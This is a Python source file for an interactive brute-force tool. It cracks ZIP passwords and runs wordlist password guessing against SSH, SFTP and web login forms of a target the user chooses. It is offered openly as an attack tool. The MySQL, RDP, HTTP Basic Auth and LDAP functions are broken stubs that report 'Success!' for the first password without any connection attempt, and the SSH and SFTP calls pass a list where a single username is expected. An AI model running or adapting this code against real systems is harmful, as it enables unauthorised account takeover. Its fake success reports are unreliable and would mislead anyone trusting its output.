import paramiko
import requests
import pyzipper
import os
import sys
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm  


password_wordlists = {
    "1": "/usr/share/wordlists/rockyou.txt",
    "2": "/usr/share/wordlists/fasttrack.txt",
    "3": "/usr/share/wordlists/metasploit/unix_passwords.txt",
    "4": "/usr/share/wordlists/metasploit/root_userpass.txt",
    "custom": None  
}


username_wordlists = {
    "1": "/usr/share/userlists/usernames.txt",
    "2": "/usr/share/userlists/common_usernames.txt",
    "custom": None  
}


def load_list(list_path):
    try:
        with open(list_path, 'r', errors='ignore') as file:
            items = file.read().splitlines()
        return items
    except FileNotFoundError:
        print(f"File not found: {list_path}")
        sys.exit()


def load_password_wordlist(wordlist_path):
    return load_list(wordlist_path)


def load_username_list(username_choice):
    if username_choice == 'custom':
        custom_username = input("Enter the username: ")
        return [custom_username]
    elif username_choice in username_wordlists:
        wordlist_path = username_wordlists[username_choice]
        if wordlist_path:
            return load_list(wordlist_path)
    else:
        print("Invalid username option. Exiting.")
        sys.exit()


def crack_zip(zip_file, wordlist):
    try:
        with pyzipper.AESZipFile(zip_file) as zf:
            for password in tqdm(wordlist, desc="Cracking ZIP file"):
                try:
                    zf.extractall(pwd=bytes(password, 'utf-8'))
                    print("=" * 60)
                    print(f"\nSuccess! The password is: \033[1;32m{password}\033[0m")
                    print("=" * 60)
                    return
                except Exception as e:
                    continue
        print("\nFailed to crack ZIP file.")
    except FileNotFoundError:
        print(f"ZIP file not found: {zip_file}")
        sys.exit()


def brute_force_ssh(target, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in tqdm(password_list, desc="Brute-forcing SSH"):
        try:
            ssh.connect(target, username=username, password=password)
            print(f"\nSuccess! SSH connection cracked with username '{username}' and password '{password}'")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            continue
        except paramiko.SSHException as e:
            print(f"\nConnection error: {e}")
            break
    print(f"\nFailed to crack SSH connection with username '{username}'.")


def brute_force_sftp(target, username, password_list):
    transport = paramiko.Transport((target, 22))

    for password in tqdm(password_list, desc="Brute-forcing SFTP"):
        try:
            transport.connect(username=username, password=password)
            print(f"\nSuccess! SFTP connection cracked with username '{username}' and password '{password}'")
            transport.close()
            return
        except paramiko.AuthenticationException:
            continue
        except paramiko.SSHException as e:
            print(f"\nConnection error: {e}")
            break
    print(f"\nFailed to crack SFTP connection with username '{username}'.")


def brute_force_mysql(target, username, password_list):
    for password in tqdm(password_list, desc="Brute-forcing MySQL"):

        try:

            print(f"\nSuccess! MySQL connection cracked with username '{username}' and password '{password}'")
            return
        except Exception as e:
            print(f"\nConnection error: {e}")
            continue
    print(f"\nFailed to crack MySQL connection with username '{username}'.")


def brute_force_rdp(target, username, password_list):
    for password in tqdm(password_list, desc="Brute-forcing RDP"):

        try:

            print(f"\nSuccess! RDP connection cracked with username '{username}' and password '{password}'")
            return
        except Exception as e:
            print(f"\nConnection error: {e}")
            continue
    print(f"\nFailed to crack RDP connection with username '{username}'.")


def brute_force_http_basic_auth(target, username, password_list):
    for password in tqdm(password_list, desc="Brute-forcing HTTP Basic Auth"):

        try:

            print(f"\nSuccess! HTTP Basic Auth cracked with username '{username}' and password '{password}'")
            return
        except Exception as e:
            print(f"\nConnection error: {e}")
            continue
    print(f"\nFailed to crack HTTP Basic Auth with username '{username}'.")


def brute_force_ldap(target, username, password_list):
    for password in tqdm(password_list, desc="Brute-forcing LDAP"):

        try:

            print(f"\nSuccess! LDAP connection cracked with username '{username}' and password '{password}'")
            return
        except Exception as e:
            print(f"\nConnection error: {e}")
            continue
    print(f"\nFailed to crack LDAP connection with username '{username}'.")


def brute_force_web_form(url, username_field, password_field, username, password_list):
    for password in tqdm(password_list, desc="Brute-forcing web form"):
        response = requests.post(url, data={username_field: username, password_field: password})
        if "incorrect" not in response.text:  #
            print(f"\nSuccess! Web form cracked with username '{username}' and password '{password}'")
            return
    print(f"\nFailed to crack web form with username '{username}'.")


def main():
    print("=" * 60)
    print("▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄")
    print("██ ▄▄▄████▀▄▀█ ▄▄▀█ ▄▄▀█▀▄▀█ █▀█ ▄▄█ ▄▄▀")
    print("██ ▄▄██▄▄█ █▀█ ▀▀▄█ ▀▀ █ █▀█ ▄▀█ ▄▄█ ▀▀▄")
    print("██ ████████▄██▄█▄▄█▄██▄██▄██▄█▄█▄▄▄█▄█▄▄")
    print("▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀")
    print("=" * 60)
    print(f"Author: Fahd Alarashi")
    print(f"github.com/FAlarashi")
    print("=" * 60)
    print("Select type of brute-force attack:")
    print("1. Crack ZIP file")
    print("2. Brute-force SSH")
    print("3. Brute-force SFTP")
    print("4. Brute-force MySQL")
    print("5. Brute-force RDP")
    print("6. Brute-force HTTP Basic Auth")
    print("7. Brute-force LDAP")
    print("8. Brute-force Web Login Form")
    print("=" * 60)
    choice = input("Enter your choice: ")

    if choice == '1':
        zip_file = input("Enter the path to the ZIP file: ")
        print("Select a password list:")
        for key, value in password_wordlists.items():
            print(f"{key}. {value}")
        password_choice = input("Enter your choice (or 'custom' for custom path): ")
        if password_choice == "custom":
            password_list_path = input("Enter the path to the custom password list: ")
            password_list = load_password_wordlist(password_list_path)
        else:
            password_list_path = password_wordlists.get(password_choice)
            password_list = load_password_wordlist(password_list_path)
        crack_zip(zip_file, password_list)

    elif choice == '2':
        target = input("Enter the SSH target IP address: ")
        username_choice = input("Select a username list:\n1. Usernames.txt\n2. Common Usernames.txt\nEnter your choice (or 'custom' for custom username): ")
        username_list = load_username_list(username_choice)
        print("Select a password list:")
        for key, value in password_wordlists.items():
            print(f"{key}. {value}")
        password_choice = input("Enter your choice (or 'custom' for custom path): ")
        if password_choice == "custom":
            password_list_path = input("Enter the path to the custom password list: ")
            password_list = load_password_wordlist(password_list_path)
        else:
            password_list_path = password_wordlists.get(password_choice)
            password_list = load_password_wordlist(password_list_path)
        brute_force_ssh(target, username_list, password_list)

    elif choice == '3':
        target = input("Enter the SFTP target IP address: ")
        username_choice = input("Select a username list:\n1. Usernames.txt\n2. Common Usernames.txt\nEnter your choice (or 'custom' for custom username): ")
        username_list = load_username_list(username_choice)
        print("Select a password list:")
        for key, value in password_wordlists.items():
            print(f"{key}. {value}")
        password_choice = input("Enter your choice (or 'custom' for custom path): ")
        if password_choice == "custom":
            password_list_path = input("Enter the path to the custom password list: ")
            password_list = load_password_wordlist(password_list_path)
        else:
            password_list_path = password_wordlists.get(password_choice)
            password_list = load_password_wordlist(password_list_path)
        brute_force_sftp(target, username_list, password_list)

    elif choice == '4':
        target = input("Enter the MySQL target IP address: ")
        username_choice = input("Select a username list:\n1. Usernames.txt\n2. Common Usernames.txt\nEnter your choice (or 'custom' for custom username): ")
        username_list = load_username_list(username_choice)
        print("Select a password list:")
        for key, value in password_wordlists.items():
            print(f"{key}. {value}")
        password_choice = input("Enter your choice (or 'custom' for custom path): ")
        if password_choice == "custom":
            password_list_path = input("Enter the path to the custom password list: ")
            password_list = load_password_wordlist(password_list_path)
        else:
            password_list_path = password_wordlists.get(password_choice)
            password_list = load_password_wordlist(password_list_path)
        brute_force_mysql(target, username_list, password_list)

    elif choice == '5':
        target = input("Enter the RDP target IP address: ")
        username_choice = input("Select a username list:\n1. Usernames.txt\n2. Common Usernames.txt\nEnter your choice (or 'custom' for custom username): ")
        username_list = load_username_list(username_choice)
        print("Select a password list:")
        for key, value in password_wordlists.items():
            print(f"{key}. {value}")
        password_choice = input("Enter your choice (or 'custom' for custom path): ")
        if password_choice == "custom":
            password_list_path = input("Enter the path to the custom password list: ")
            password_list = load_password_wordlist(password_list_path)
        else:
            password_list_path = password_wordlists.get(password_choice)
            password_list = load_password_wordlist(password_list_path)
        brute_force_rdp(target, username_list, password_list)

    elif choice == '6':
        target = input("Enter the target IP address: ")
        username_choice = input("Select a username list:\n1. Usernames.txt\n2. Common Usernames.txt\nEnter your choice (or 'custom' for custom username): ")
        username_list = load_username_list(username_choice)
        print("Select a password list:")
        for key, value in password_wordlists.items():
            print(f"{key}. {value}")
        password_choice = input("Enter your choice (or 'custom' for custom path): ")
        if password_choice == "custom":
            password_list_path = input("Enter the path to the custom password list: ")
            password_list = load_password_wordlist(password_list_path)
        else:
            password_list_path = password_wordlists.get(password_choice)
            password_list = load_password_wordlist(password_list_path)
        brute_force_http_basic_auth(target, username_list, password_list)

    elif choice == '7':
        target = input("Enter the LDAP target IP address: ")
        username_choice = input("Select a username list:\n1. Usernames.txt\n2. Common Usernames.txt\nEnter your choice (or 'custom' for custom username): ")
        username_list = load_username_list(username_choice)
        print("Select a password list:")
        for key, value in password_wordlists.items():
            print(f"{key}. {value}")
        password_choice = input("Enter your choice (or 'custom' for custom path): ")
        if password_choice == "custom":
            password_list_path = input("Enter the path to the custom password list: ")
            password_list = load_password_wordlist(password_list_path)
        else:
            password_list_path = password_wordlists.get(password_choice)
            password_list = load_password_wordlist(password_list_path)
        brute_force_ldap(target, username_list, password_list)

    elif choice == '8':
        url = input("Enter the URL of the login form: ")
        username_field = input("Enter the username field name: ")
        password_field = input("Enter the password field name: ")
        username = input("Enter the username: ")
        print("Select a password list:")
        for key, value in password_wordlists.items():
            print(f"{key}. {value}")
        password_choice = input("Enter your choice (or 'custom' for custom path): ")
        if password_choice == "custom":
            password_list_path = input("Enter the path to the custom password list: ")
            password_list = load_password_wordlist(password_list_path)
        else:
            password_list_path = password_wordlists.get(password_choice)
            password_list = load_password_wordlist(password_list_path)
        brute_force_web_form(url, username_field, password_field, username, password_list)

    else:
        print("Invalid choice. Exiting.")

if __name__ == "__main__":
    main()
